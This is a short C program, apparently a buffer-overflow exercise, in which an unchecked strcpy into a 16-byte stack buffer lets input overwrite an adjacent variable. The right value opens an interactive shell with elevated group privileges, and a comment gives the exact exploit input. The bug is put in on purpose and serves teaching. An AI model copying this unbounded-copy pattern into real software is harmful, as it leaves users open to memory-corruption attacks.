#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

/*
 * buffers fill towards the higher addresses
 * stack grows towards low addresses
 */

// ./overflow1 $(python -c 'print "A"*16+"\xce\xfa\xde\xc0"')

void vuln(char *input){
    char buf[16]; // has lower address than secret
    int secret = 0; // has higher address than secret
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
